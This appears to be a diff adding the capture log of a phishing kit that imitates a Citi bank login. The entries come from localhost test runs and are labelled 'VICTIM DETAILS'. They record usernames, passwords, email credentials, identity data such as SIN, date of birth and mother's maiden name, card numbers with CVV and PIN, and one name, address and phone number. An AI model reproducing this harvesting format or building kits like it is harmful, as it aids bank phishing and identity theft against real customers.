@@ -1,0 +1,262 @@
+[🍁  | CITI LOGIN  | CLIENT :../css/.ico 🍁]
+
+********** [ 💻 LOGIN DETAILS 💻 ] **********
+# USERNAME   : ss
+# PASSWORD   : ss
+********** [ 🌍 BROWSER DETAILS 🌍 ] **********
+# USERAGENT  : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36
+# LANGUAGE   : 
+# BROWSER    : Chrome
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+# LONGITUDE  : 
+# LATITUDE   : 
+# CITY(IP)   : 
+# TIMEZONE   : UTC, 
+# HOSTNAME   : 
+# IP TYPE    : 
+# COUNTRY    : , 
+# REGION     : 
+# DATE       : 10:42:51 23/04/2022
+# TIME       : 
+# ISP        : 
+**********************************************
+[🍁  | CITI LOGIN  | CLIENT :../css/.ico 🍁]
+
+********** [ 💻 LOGIN DETAILS 💻 ] **********
+# USERNAME   : ss
+# PASSWORD   : ss
+********** [ 🌍 BROWSER DETAILS 🌍 ] **********
+# USERAGENT  : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36
+# LANGUAGE   : 
+# BROWSER    : Chrome
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+# LONGITUDE  : 
+# LATITUDE   : 
+# CITY(IP)   : 
+# TIMEZONE   : UTC, 
+# HOSTNAME   : 
+# IP TYPE    : 
+# COUNTRY    : , 
+# REGION     : 
+# DATE       : 10:43:12 23/04/2022
+# TIME       : 
+# ISP        : 
+**********************************************
+[🍁  | CITI LOGIN  | CLIENT :../css/.ico 🍁]
+
+********** [ 💻 LOGIN DETAILS 💻 ] **********
+# USERNAME   : ss
+# PASSWORD   : ss
+********** [ 🌍 BROWSER DETAILS 🌍 ] **********
+# USERAGENT  : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36
+# LANGUAGE   : 
+# BROWSER    : Chrome
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+# LONGITUDE  : 
+# LATITUDE   : 
+# CITY(IP)   : 
+# TIMEZONE   : UTC, 
+# HOSTNAME   : 
+# IP TYPE    : 
+# COUNTRY    : , 
+# REGION     : 
+# DATE       : 10:43:43 23/04/2022
+# TIME       : 
+# ISP        : 
+**********************************************
+[🍁  | CITI LOGIN  | CLIENT :../css/.ico 🍁]
+
+********** [ 💻 LOGIN DETAILS 💻 ] **********
+# USERNAME   : ss
+# PASSWORD   : ss
+********** [ 🌍 BROWSER DETAILS 🌍 ] **********
+# USERAGENT  : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36
+# BROWSER    : Chrome
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+# LONGITUDE  : 
+# LATITUDE   : 
+# CITY(IP)   : 
+# TIMEZONE   : UTC, 
+# HOSTNAME   : 
+# IP TYPE    : 
+# COUNTRY    : , 
+# REGION     : 
+# DATE       : 10:44:02 23/04/2022
+# TIME       : 
+# ISP        : 
+**********************************************
+[🍁  | CITI LOGIN  | CLIENT :../css/.ico 🍁]
+
+********** [ 💻 LOGIN DETAILS 💻 ] **********
+# USERNAME   : ss
+# PASSWORD   : ss
+********** [ 🌍 BROWSER DETAILS 🌍 ] **********
+# USERAGENT  : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36
+# BROWSER    : Chrome
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+# LONGITUDE  : 
+# LATITUDE   : 
+# CITY(IP)   : 
+# TIMEZONE   : UTC
+# HOSTNAME   : 
+# IP TYPE    : 
+# COUNTRY    : , 
+# REGION     : 
+# DATE       : 10:44:50 23/04/2022
+# ISP        : 
+**********************************************
+[🍁  | CITI LOGIN  | CLIENT :../css/.ico 🍁]
+
+********** [ 💻 LOGIN DETAILS 💻 ] **********
+# USERNAME   : ss
+# PASSWORD   : ss
+********** [ 🌍 BROWSER DETAILS 🌍 ] **********
+# USERAGENT  : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36
+# BROWSER    : Chrome
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+# LONGITUDE  : 
+# LATITUDE   : 
+# CITY(IP)   : 
+# TIMEZONE   : UTC
+# HOSTNAME   : 
+# IP TYPE    : 
+# COUNTRY    : , 
+# REGION     : 
+# DATE       : 10:45:02 23/04/2022
+# ISP        : 
+**********************************************
+[🍁 | CITI EMAIL | CLIENT : 🍁]
+
+********** [ 📩 EMAIL LOGIN 📩 ] **********
+# EMAIL       : qqq
+# PASSWORD    : qqq
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI EMAIL | CLIENT :../css/.ico 🍁]
+
+********** [ 📩 EMAIL LOGIN 📩 ] **********
+# EMAIL       : qqq
+# PASSWORD    : qqq
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI EMAIL | CLIENT :../css/.ico 🍁]
+
+********** [ 📩 EMAIL LOGIN 📩 ] **********
+# EMAIL       : qqq
+# PASSWORD    : qqq
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI IDENTITY | CLIENT : 🍁]
+
+********** [ IDENTITY INFORMATION ] **********
+# SIN         : 111-11-1111
+# DOB         : 11/11/111
+# MMN         : 1111
+# DLN         : 111111111
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI IDENTITY | CLIENT :127.0.0.1 🍁]
+
+********** [ IDENTITY INFORMATION ] **********
+# SIN         : 111-11-1111
+# DOB         : 11/11/111
+# MMN         : 1111
+# DLN         : 111111111
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI IDENTITY | CLIENT :127.0.0.1 🍁]
+
+********** [ IDENTITY INFORMATION ] **********
+# SIN         : 111-11-1111
+# DOB         : 11/11/111
+# MMN         : 1111
+# DLN         : 111111111
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI PERSONAL | CLIENT :127.0.0.1 🍁]
+
+********** [ ADDRESS INFORMATION ] **********
+# FIRSTNAME   : 
+# LASTNAME    : LAWAL
+# ADDRESS     : 4B IDAK OKPO
+# ZIP CODE    : 24400
+# NUMBER      : +1(068)-391-7202
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI PERSONAL | CLIENT :127.0.0.1 🍁]
+
+********** [ ADDRESS INFORMATION ] **********
+# FIRSTNAME   : 
+# LASTNAME    : LAWAL
+# ADDRESS     : 4B IDAK OKPO
+# ZIP CODE    : 24400
+# NUMBER      : +1(068)-391-7202
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI PERSONAL | CLIENT :127.0.0.1 🍁]
+
+********** [ ADDRESS INFORMATION ] **********
+# FIRSTNAME   : 
+# LASTNAME    : LAWAL
+# ADDRESS     : 4B IDAK OKPO
+# ZIP CODE    : 24400
+# NUMBER      : +1(068)-391-7202
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI PERSONAL | CLIENT :127.0.0.1 🍁]
+
+********** [ ADDRESS INFORMATION ] **********
+# FIRSTNAME   : 
+# LASTNAME    : LAWAL
+# ADDRESS     : 4B IDAK OKPO
+# ZIP CODE    : 24400
+# NUMBER      : +1(068)-391-7202
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI PERSONAL | CLIENT :127.0.0.1 🍁]
+
+********** [ ADDRESS INFORMATION ] **********
+# FIRSTNAME   : FEMI1
+# LASTNAME    : LAWAL
+# ADDRESS     : 4B IDAK OKPO
+# ZIP CODE    : 24400
+# NUMBER      : +1(068)-391-7202
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI CARD  | CLIENT :127.0.0.1 🍁]
+
+********** [ 💳 CARD INFORMATION 💳 ] **********
+# CARD NUMBER : 1111 1111 1111 11
+# EXPIRE      : 11/1111
+# CARD CODE   : 111
+# CARD PIN    : 1111
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
+[🍁 | CITI CARD  | CLIENT :127.0.0.1 🍁]
+
+********** [ 💳 CARD INFORMATION 💳 ] **********
+# CARD NUMBER : 1111 1111 1111 11
+# EXPIRE      : 11/1111
+# CARD CODE   : 111
+# CARD PIN    : 1111
+********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
+# IP ADDRESS : 127.0.0.1
+**********************************************
